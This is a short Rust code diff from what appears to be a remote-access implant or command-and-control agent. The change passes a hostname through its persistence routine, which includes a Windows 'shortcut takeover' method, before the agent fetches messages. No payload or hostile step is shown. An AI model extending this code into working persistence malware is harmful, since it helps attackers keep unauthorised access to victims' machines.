@@ -49,7 +49,7 @@ struct OutputMessage {
 }
 
 #[inline]
-fn persist(id: &str) -> bool{
+fn persist(id: &str, hostname: &str) -> bool {
         // Persitence:
     match config::persistence() {
         Persistence::None => {
@@ -66,7 +66,7 @@ fn persist(id: &str) -> bool{
             }
         },
         Persistence::ShortcutTakeover => {
-            match win_persist::shortcut_takeover(&id) {
+            match win_persist::shortcut_takeover(&id, &hostname) {
                 Ok(_) => {
                     return true;
                 },
@@ -172,7 +172,7 @@ async fn main() {
 
         // TODO: There is an issue. If an agent fails to
         // acquire an ID then it won't persist. Fix this.
-        persist(&id);
+        persist(&id, &hostname);
 
         debug_println!("fetching messages");
 
